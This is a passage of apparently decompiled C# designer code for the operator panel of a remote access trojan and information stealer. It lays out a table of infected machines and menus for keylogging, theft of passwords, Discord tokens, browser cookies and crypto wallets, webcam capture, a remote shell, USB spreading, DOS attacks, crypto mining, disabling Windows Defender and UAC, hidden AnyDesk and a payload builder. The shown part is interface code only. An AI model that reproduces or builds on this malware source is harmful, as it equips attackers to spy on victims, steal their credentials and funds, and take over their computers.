namespace Server
{
	// Token: 0x0200001A RID: 26
	public partial class Form1 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000156 RID: 342 RVA: 0x0000276D File Offset: 0x0000096D
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00013CE4 File Offset: 0x00011EE4
		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            this.listView1 = new System.Windows.Forms.ListView();
            this.lv_ip = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_country = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_name = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_group = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_last = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_hwid = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_user = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_admin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_av = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ping = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Wallet_ok = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_act = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuClient = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.aBOUTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.searchToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.remoteDesktopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.sENDFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tODISKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tOMEMORYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.monitoringToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restScaleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clipboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.setToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.getToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.onkineToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.offlineToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.recoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordRecoveryToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.dicordTokensToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fireFoxCookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.chromiumCookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.walletsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.processManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.killProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reportWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.webcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockSiteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.blockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.resetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webBrowserPassViewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.allInOneRecoveryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.miscellaneousToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteShellToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.botsKillerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uSBSpreadToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.seedTorrentToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.dOSAttackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.executeNETCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.xMRMinerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.filesSearcherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.extraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.visitWebsiteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.saToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.backToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendMessageBoxToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.chatToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.getAdminPrivilegesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blankScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.disableWindowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.avastRemovalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.setWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.getscreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem_1 = new System.Windows.Forms.ToolStripMenuItem();
            this.net35InstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.closeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.updateToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem_0 = new System.Windows.Forms.ToolStripMenuItem();
            this.logoffToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.shutdownToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.backProxyUIToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.serverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockClientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.hiddenAnydeskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.bUILDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.showFolderToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ping = new System.Windows.Forms.Timer(this.components);
            this.UpdateUI = new System.Windows.Forms.Timer(this.components);
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.listView2 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.listView3 = new System.Windows.Forms.ListView();
            this.contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.listView4 = new System.Windows.Forms.ListView();
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuTasks = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.gETLOGSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.walletsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.pASSWORDRECOVERYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sENDFILETOMEMORYToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.minerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.uPDATEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.dELETETASKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.gOTOToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.desktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cLEARToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tabPage6 = new System.Windows.Forms.TabPage();
            this.listView5 = new System.Windows.Forms.ListView();
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader11 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader12 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader13 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader14 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader15 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader16 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader17 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader18 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader19 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader20 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader21 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader22 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader23 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader24 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader25 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader26 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader27 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader28 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader29 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader30 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader31 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader32 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader33 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.searchHWIDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyIDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.gOTOToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.clearToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
            this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.TimerTask = new System.Windows.Forms.Timer(this.components);
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuClient.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.contextMenuLogs.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.contextMenuThumbnail.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.contextMenuTasks.SuspendLayout();
            this.tabPage5.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.tabPage6.SuspendLayout();
            this.contextMenuStrip2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).BeginInit();
            this.SuspendLayout();
            // 
            // listView1
            // 
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.lv_ip,
            this.lv_country,
            this.lv_name,
            this.lv_group,
            this.lv_last,
            this.lv_hwid,
            this.lv_user,
            this.lv_admin,
            this.lv_os,
            this.lv_av,
            this.lv_ping,
            this.Wallet_ok,
            this.lv_act});
            this.listView1.ContextMenuStrip = this.contextMenuClient;
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(2, 1);
            this.listView1.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.ShowItemToolTips = true;
            this.listView1.Size = new System.Drawing.Size(1271, 321);
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.ListView1_ColumnClick);
            this.listView1.SelectedIndexChanged += new System.EventHandler(this.listView1_SelectedIndexChanged);
            this.listView1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.listView1_KeyDown);
            this.listView1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.listView1_MouseMove);
            // 
            // lv_ip
            // 
            this.lv_ip.Text = "IP Address";
            this.lv_ip.Width = 121;
            // 
            // lv_country
            // 
            this.lv_country.Text = "Country";
            this.lv_country.Width = 124;
            // 
            // lv_name
            // 
            this.lv_name.Text = "Name";
            this.lv_name.Width = 124;
            // 
            // lv_group
            // 
            this.lv_group.Text = "Group";
            this.lv_group.Width = 90;
            // 
            // lv_last
            // 
            this.lv_last.Text = "LastInputTime";
            this.lv_last.Width = 185;
            // 
            // lv_hwid
            // 
            this.lv_hwid.Text = "HWID";
            this.lv_hwid.Width = 117;
            // 
            // lv_user
            // 
            this.lv_user.Text = "Username";
            this.lv_user.Width = 117;
            // 
            // lv_admin
            // 
            this.lv_admin.Text = "Privileges";
            this.lv_admin.Width = 166;
            // 
            // lv_os
            // 
            this.lv_os.Text = "Operating System";
            this.lv_os.Width = 179;
            // 
            // lv_av
            // 
            this.lv_av.Text = "Anti-Virus Software";
            this.lv_av.Width = 136;
            // 
            // lv_ping
            // 
            this.lv_ping.Text = "Ping";
            // 
            // Wallet_ok
            // 
            this.Wallet_ok.Text = "Wallet";
            this.Wallet_ok.Width = 80;
            // 
            // lv_act
            // 
            this.lv_act.Text = "Active Window";
            this.lv_act.Width = 350;
            // 
            // contextMenuClient
            // 
            this.contextMenuClient.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuClient.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.aBOUTToolStripMenuItem,
            this.searchToolStripMenuItem,
            this.fileManagerToolStripMenuItem1,
            this.toolStripSeparator2,
            this.remoteDesktopToolStripMenuItem1,
            this.sENDFILEToolStripMenuItem,
            this.monitoringToolStripMenuItem,
            this.webBrowserPassViewToolStripMenuItem,
            this.allInOneRecoveryToolStripMenuItem1,
            this.miscellaneousToolStripMenuItem,
            this.extraToolStripMenuItem,
            this.systemToolStripMenuItem,
            this.toolStripSeparator1,
            this.backProxyUIToolStripMenuItem,
            this.serverToolStripMenuItem,
            this.toolStripSeparator5,
            this.hiddenAnydeskToolStripMenuItem,
            this.bUILDERToolStripMenuItem,
            this.renameToolStripMenuItem,
            this.showFolderToolStripMenuItem1});
            this.contextMenuClient.Name = "contextMenuStrip1";
            this.contextMenuClient.Size = new System.Drawing.Size(174, 396);
            // 
            // aBOUTToolStripMenuItem
            // 
            this.aBOUTToolStripMenuItem.Name = "aBOUTToolStripMenuItem";
            this.aBOUTToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.aBOUTToolStripMenuItem.Text = "ABOUT";
            this.aBOUTToolStripMenuItem.Click += new System.EventHandler(this.ABOUTToolStripMenuItem_Click);
            // 
            // searchToolStripMenuItem
            // 
            this.searchToolStripMenuItem.Name = "searchToolStripMenuItem";
            this.searchToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.searchToolStripMenuItem.Text = "Search HWID";
            this.searchToolStripMenuItem.Click += new System.EventHandler(this.searchToolStripMenuItem_Click);
            // 
            // fileManagerToolStripMenuItem1
            // 
            this.fileManagerToolStripMenuItem1.Name = "fileManagerToolStripMenuItem1";
            this.fileManagerToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.fileManagerToolStripMenuItem1.Text = "File Manager";
            this.fileManagerToolStripMenuItem1.Click += new System.EventHandler(this.fileManagerToolStripMenuItem1_Click_1);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(170, 6);
            // 
            // remoteDesktopToolStripMenuItem1
            // 
            this.remoteDesktopToolStripMenuItem1.Name = "remoteDesktopToolStripMenuItem1";
            this.remoteDesktopToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.remoteDesktopToolStripMenuItem1.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem1.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem1_Click_1);
            // 
            // sENDFILEToolStripMenuItem
            // 
            this.sENDFILEToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.tODISKToolStripMenuItem,
            this.webToolStripMenuItem,
            this.tOMEMORYToolStripMenuItem,
            this.toUACToolStripMenuItem});
            this.sENDFILEToolStripMenuItem.Name = "sENDFILEToolStripMenuItem";
            this.sENDFILEToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.sENDFILEToolStripMenuItem.Text = "Send File";
            // 
            // tODISKToolStripMenuItem
            // 
            this.tODISKToolStripMenuItem.Name = "tODISKToolStripMenuItem";
            this.tODISKToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
            this.tODISKToolStripMenuItem.Text = "To Disk";
            this.tODISKToolStripMenuItem.Click += new System.EventHandler(this.TODISKToolStripMenuItem_Click);
            // 
            // webToolStripMenuItem
            // 
            this.webToolStripMenuItem.Name = "webToolStripMenuItem";
            this.webToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
            this.webToolStripMenuItem.Text = "To Url";
            this.webToolStripMenuItem.Click += new System.EventHandler(this.webToolStripMenuItem_Click);
            // 
            // tOMEMORYToolStripMenuItem
            // 
            this.tOMEMORYToolStripMenuItem.Name = "tOMEMORYToolStripMenuItem";
            this.tOMEMORYToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
            this.tOMEMORYToolStripMenuItem.Text = "To Memory";
            this.tOMEMORYToolStripMenuItem.Click += new System.EventHandler(this.TOMEMORYToolStripMenuItem_Click);
            // 
            // toUACToolStripMenuItem
            // 
            this.toUACToolStripMenuItem.Name = "toUACToolStripMenuItem";
            this.toUACToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
            this.toUACToolStripMenuItem.Text = "To Disk [RunAs]";
            this.toUACToolStripMenuItem.Click += new System.EventHandler(this.toUACToolStripMenuItem_Click);
            // 
            // monitoringToolStripMenuItem
            // 
            this.monitoringToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.restScaleToolStripMenuItem,
            this.clipboardToolStripMenuItem,
            this.keyloggerToolStripMenuItem1,
            this.recoveryToolStripMenuItem,
            this.walletsToolStripMenuItem,
            this.processManagerToolStripMenuItem1,
            this.killProcessToolStripMenuItem,
            this.reportWindowToolStripMenuItem,
            this.webcamToolStripMenuItem,
            this.blockSiteToolStripMenuItem1});
            this.monitoringToolStripMenuItem.Name = "monitoringToolStripMenuItem";
            this.monitoringToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.monitoringToolStripMenuItem.Text = "Monitoring";
            this.monitoringToolStripMenuItem.Click += new System.EventHandler(this.monitoringToolStripMenuItem_Click);
            // 
            // restScaleToolStripMenuItem
            // 
            this.restScaleToolStripMenuItem.Name = "restScaleToolStripMenuItem";
            this.restScaleToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.restScaleToolStripMenuItem.Text = "Rest Scale";
            this.restScaleToolStripMenuItem.Click += new System.EventHandler(this.restScaleToolStripMenuItem_Click);
            // 
            // clipboardToolStripMenuItem
            // 
            this.clipboardToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.setToolStripMenuItem,
            this.getToolStripMenuItem});
            this.clipboardToolStripMenuItem.Name = "clipboardToolStripMenuItem";
            this.clipboardToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.clipboardToolStripMenuItem.Text = "Clipboard";
            // 
            // setToolStripMenuItem
            // 
            this.setToolStripMenuItem.Name = "setToolStripMenuItem";
            this.setToolStripMenuItem.Size = new System.Drawing.Size(116, 22);
            this.setToolStripMenuItem.Text = "Set Text";
            this.setToolStripMenuItem.Click += new System.EventHandler(this.setToolStripMenuItem_Click);
            // 
            // getToolStripMenuItem
            // 
            this.getToolStripMenuItem.Name = "getToolStripMenuItem";
            this.getToolStripMenuItem.Size = new System.Drawing.Size(116, 22);
            this.getToolStripMenuItem.Text = "Get Text";
            this.getToolStripMenuItem.Click += new System.EventHandler(this.getToolStripMenuItem_Click);
            // 
            // keyloggerToolStripMenuItem1
            // 
            this.keyloggerToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.onkineToolStripMenuItem,
            this.offlineToolStripMenuItem});
            this.keyloggerToolStripMenuItem1.Name = "keyloggerToolStripMenuItem1";
            this.keyloggerToolStripMenuItem1.Size = new System.Drawing.Size(164, 22);
            this.keyloggerToolStripMenuItem1.Text = "Keylogger";
            this.keyloggerToolStripMenuItem1.Click += new System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
            // 
            // onkineToolStripMenuItem
            // 
            this.onkineToolStripMenuItem.Name = "onkineToolStripMenuItem";
            this.onkineToolStripMenuItem.Size = new System.Drawing.Size(110, 22);
            this.onkineToolStripMenuItem.Text = "Online";
            this.onkineToolStripMenuItem.Click += new System.EventHandler(this.onkineToolStripMenuItem_Click);
            // 
            // offlineToolStripMenuItem
            // 
            this.offlineToolStripMenuItem.Name = "offlineToolStripMenuItem";
            this.offlineToolStripMenuItem.Size = new System.Drawing.Size(110, 22);
            this.offlineToolStripMenuItem.Text = "Offline";
            this.offlineToolStripMenuItem.Click += new System.EventHandler(this.offlineToolStripMenuItem_Click);
            // 
            // recoveryToolStripMenuItem
            // 
            this.recoveryToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem1,
            this.passwordRecoveryToolStripMenuItem2,
            this.dicordTokensToolStripMenuItem,
            this.fireFoxCookiesToolStripMenuItem,
            this.chromiumCookiesToolStripMenuItem});
            this.recoveryToolStripMenuItem.Name = "recoveryToolStripMenuItem";
            this.recoveryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.recoveryToolStripMenuItem.Text = "Recovery";
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
            this.toolStripMenuItem1.Text = "AMW PASS";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // passwordRecoveryToolStripMenuItem2
            // 
            this.passwordRecoveryToolStripMenuItem2.Name = "passwordRecoveryToolStripMenuItem2";
            this.passwordRecoveryToolStripMenuItem2.Size = new System.Drawing.Size(175, 22);
            this.passwordRecoveryToolStripMenuItem2.Text = "Password Recovery";
            this.passwordRecoveryToolStripMenuItem2.Click += new System.EventHandler(this.passwordRecoveryToolStripMenuItem2_Click);
            // 
            // dicordTokensToolStripMenuItem
            // 
            this.dicordTokensToolStripMenuItem.Name = "dicordTokensToolStripMenuItem";
            this.dicordTokensToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            this.dicordTokensToolStripMenuItem.Text = "DicordTokens";
            this.dicordTokensToolStripMenuItem.Click += new System.EventHandler(this.dicordTokensToolStripMenuItem_Click);
            // 
            // fireFoxCookiesToolStripMenuItem
            // 
            this.fireFoxCookiesToolStripMenuItem.Name = "fireFoxCookiesToolStripMenuItem";
            this.fireFoxCookiesToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            this.fireFoxCookiesToolStripMenuItem.Text = "FireFoxCookies";
            this.fireFoxCookiesToolStripMenuItem.Click += new System.EventHandler(this.fireFoxCookiesToolStripMenuItem_Click);
            // 
            // chromiumCookiesToolStripMenuItem
            // 
            this.chromiumCookiesToolStripMenuItem.Name = "chromiumCookiesToolStripMenuItem";
            this.chromiumCookiesToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            this.chromiumCookiesToolStripMenuItem.Text = "ChromiumCookies";
            this.chromiumCookiesToolStripMenuItem.Click += new System.EventHandler(this.chromiumCookiesToolStripMenuItem_Click);
            // 
